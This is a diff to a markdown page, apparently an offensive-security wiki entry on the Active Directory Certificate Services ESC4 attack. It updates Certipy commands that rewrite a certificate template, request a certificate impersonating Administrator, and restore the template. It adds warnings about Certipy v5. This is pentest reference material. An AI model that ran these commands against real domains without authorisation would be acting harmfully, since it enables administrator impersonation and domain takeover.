@@ -1,5 +1,5 @@
 ---
-authors: Croumi, ShutdownRepo, lap1nou, sckdev, BlWasp
+authors: Croumi, ShutdownRepo, lap1nou, sckdev, BlWasp, NevaSec
 category: ad
 ---
 
@@ -57,17 +57,21 @@ In order to obtain an abusable template, some attributes and parameters need to 
 
 From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate these sensitive access control entries ([how to enumerate](./#attack-paths)), and to overwrite the template in order to add the SAN attribute and make it vulnerable to ESC1. It also had the capacity to save the old configuration in order to restore it after the attack.
 
+> [!WARNING] Certipy v5
+> Certipy introduced new behavior and flags in version 5.0. Some commands were renamed or replaced, and automatic backup of the template configuration is now performed.
+
+> [!WARNING] Template backup
+> Running the command twice will override the backup file, make sure to keep a second backup of the old configuration somewhere.
+
 ```bash
 # 1. Save the old configuration, edit the template and make it vulnerable
-certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template templateName -save-old
-
-# Warning: running the coommand twice will override the backup file, make sure to keep a seconde backup of the old configuration somwhere.
+certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template "$ESC4_TEMPLATE_NAME" -write-default-configuration
 
 # 2. Request a template certificate with a custom SAN
-certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca "$CA_NAME" -template "$ESC4_TEMPLATE_NAME" -upn "Administrator@$DOMAIN"
 
 # 3. After the attack, restore the original configuration
-certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template templateName -configuration 'templateName.json'
+certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template "$ESC4_TEMPLATE_NAME" -write-configuration "$ESC4_TEMPLATE_NAME.json" -no-save
 ```
 
 If a more precise template modification is needed, [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate) (Python) can be used to modify each attributes of the template.
@@ -87,10 +91,7 @@ modifyCertTemplate.py -template templateName -value "'1.3.6.1.5.5.7.3.2', '1.3.6
 ```
 
 > [!TIP]
->
 > By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
-
-
 
 === Windows
 
